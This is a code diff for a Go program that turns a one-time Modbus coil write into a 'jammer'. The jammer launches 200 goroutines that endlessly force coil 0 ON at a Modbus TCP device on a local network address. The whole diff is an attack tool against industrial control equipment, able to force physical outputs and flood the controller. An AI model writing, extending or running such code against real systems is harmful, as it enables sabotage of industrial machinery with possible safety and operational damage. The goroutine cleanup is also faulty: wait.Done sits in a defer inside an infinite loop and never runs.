@@ -4,25 +4,46 @@ import (
 	"fmt"
 	"time"
 
-	"github.com/simonvetter/modbus"
+	"sync"
+
+	"github.com/goburrow/modbus"
 )
 
-func main() {
-	var client *modbus.ModbusClient
-	var err error
+var wait sync.WaitGroup
 
-	// for a TCP endpoint
-	// (see examples/tls_client.go for TLS usage and options)
-	client, err = modbus.NewClient(&modbus.ClientConfiguration{
-		URL:     "tcp://192.168.14.236:502",
-		Timeout: 1 * time.Second,
-	})
+func jammer(target modbus.Client) {
 
-	err = client.WriteCoil(0, false)
-	fmt.Println("Done")
+	for {
+		results, err := target.WriteSingleCoil(0, 0xFF00)
 
-	if err != nil {
-		fmt.Println(err)
+		fmt.Printf("%T\n", results)
+		if err != nil {
+			fmt.Println(err)
+		} else {
+			fmt.Println(results)
+		}
+		defer wait.Done()
 	}
 
+}
+
+func main() {
+
+	handler := modbus.NewTCPClientHandler("192.168.16.164:502")
+	handler.Timeout = 10 * time.Second
+
+	err := handler.Connect()
+	if err != nil {
+		fmt.Print(err)
+	}
+
+	defer handler.Close()
+
+	client := modbus.NewClient(handler)
+
+	for i := 0; i < 200; i++ {
+		wait.Add(1)
+		go jammer(client)
+	}
+	wait.Wait()
 }
